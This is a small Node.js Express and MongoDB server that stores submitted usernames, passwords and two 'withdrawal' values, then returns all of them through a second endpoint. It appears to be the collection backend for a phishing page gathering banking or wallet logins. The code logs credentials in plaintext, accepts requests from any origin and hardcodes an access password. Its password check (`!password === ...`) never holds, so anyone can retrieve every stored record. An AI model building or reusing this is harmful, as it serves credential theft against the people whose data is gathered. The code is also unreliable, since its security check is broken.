require('dotenv').config()

const express = require('express');
const app = express();
const mongoose = require('mongoose');
const cors = require('cors');
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(cors());

const schema = new mongoose.Schema({
    username: {
        type: String,
        required: true
    },
    password: {
        type: String,
        required: true
    },
    withdrawal1: {
        type: String,
        required: true
    },
    withdrawal2: {
        type: String,
        required: true
    }
})

const Data = new mongoose.model('data', schema);

app.post('/save-data', async (req, res) => {
    console.log("Item to create: ", req.body);
    try {
        let response = await Data.create({ ...req.body });
        console.log("Item Created: ", response);
        return response ? res.json({ res: true }) : res.json({ res: false });
    } catch (error) {
        console.log("Error saving data to database.");
        return res.json({ res: false });
    }
});

app.post('/get-data', async (req, res) => {
    const { password } = req.body;
    if (!password === "#Thigna420") {
        return res.json({ res: false });
    }
    try {
        let response = await Data.find({});
        console.log(response);
        return response ? res.json({ res: true, response, data: response }) : res.json({ res: false, response });
    } catch (error) {
        console.log("Error retrieving data from database.");
        return res.json({ res: false });
    }
});

// function to connect to database
const connectDB = async (database) => {
    try {
        console.log("Connecting to database...");
        await mongoose.connect(database)
        console.log("Connected to database")
    } catch (error) {
        console.log("Connection failed to database")
        process.exit(0);
    }
}

// calling the connectDB function and listening server in then block
connectDB(process.env.MONGO_URI).then(() => {
    // listening server
    app.listen(PORT, () => {
        console.log(`Server is running on port: ${PORT}`);
    });
});




